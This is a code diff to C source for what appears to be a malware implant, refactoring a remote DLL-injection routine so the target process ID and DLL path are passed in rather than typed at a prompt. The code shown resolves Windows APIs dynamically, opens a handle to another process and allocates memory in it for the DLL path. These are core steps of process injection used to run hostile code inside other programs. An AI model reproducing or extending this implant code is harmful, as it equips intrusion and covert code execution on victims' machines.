@@ -69,10 +69,7 @@ VOID inject_self(IMPLANT_CONFIG config) {
     VirtualFree(allocate_mem, 0, MEM_RELEASE);
 }
 
-VOID remote_inject() {
-    printf("Enter process PID to inject: ");
-    DWORD pid;
-    scanf("%lu", &pid);
+VOID remote_inject(DWORD pid, wchar_t* dllPath) {
 
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
     RESOLVE(pOpenProcess, OpenProcess, k32);
@@ -87,10 +84,8 @@ VOID remote_inject() {
     if (remote_proc != NULL) printf("[x] Opened handle to process\n");
     else { printf("[-] Failed to open handle to remote process\n"); return; }
 
-    printf("Path of DLL to inject: ");
-    WCHAR dllPath[MAX_PATH] = { 0 };
-    wscanf(L"%s", dllPath);
     SIZE_T dllPathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
+
 
     LPVOID inject_addr = VirtualAllocEx(remote_proc, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (inject_addr != NULL) printf("[x] Allocated memory in process\n");
